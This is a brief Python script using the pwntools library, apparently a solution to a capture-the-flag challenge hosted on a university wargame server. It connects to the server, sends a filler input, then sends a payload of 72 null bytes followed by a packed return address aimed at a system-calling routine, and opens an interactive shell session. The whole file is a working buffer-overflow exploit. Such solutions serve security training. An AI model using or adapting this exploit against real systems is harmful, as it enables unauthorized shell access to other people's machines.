from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', '10000')
sys_addr = p32(0x804860e)
payload = 'aaa'
r.sendline(payload)
payload2 = b'\x00' * 72 + sys_addr
r.sendafter(' MAGIC:', payload2)
r.interactive()
